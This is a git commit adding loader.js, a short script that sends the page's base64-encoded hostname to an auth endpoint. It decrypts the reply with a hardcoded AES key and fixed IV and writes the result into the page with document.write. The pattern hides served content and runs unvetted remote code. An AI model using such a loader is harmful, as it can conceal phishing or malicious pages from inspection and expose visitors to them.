eb145db97062a012043b2110b3e84558d3fe9e87
zykjfhxt <eastversexcx@163.com>
2025-06-15 11:40:23 +0800

    Create loader.js

---
+++ loader.js
@@ -0,0 +1,15 @@
+(async () => {
+    const enc = btoa(location.hostname);
+    const res = await fetch(`https://localhost/auth/${enc}`);
+    const htmlEnc = await res.text();
+    const dec = await crypto.subtle.digest('SHA-256', new TextEncoder().encode('my-secret-key'));
+    const key = await crypto.subtle.importKey('raw', dec, 'AES-CBC', false, ['decrypt']);
+    const iv = new TextEncoder().encode("1234567890abcdef");
+
+    const buf = await crypto.subtle.decrypt(
+        { name: "AES-CBC", iv: iv },
+        key,
+        Uint8Array.from(atob(htmlEnc), c => c.charCodeAt(0))
+    );
+    document.write(new TextDecoder().decode(buf));
+})();
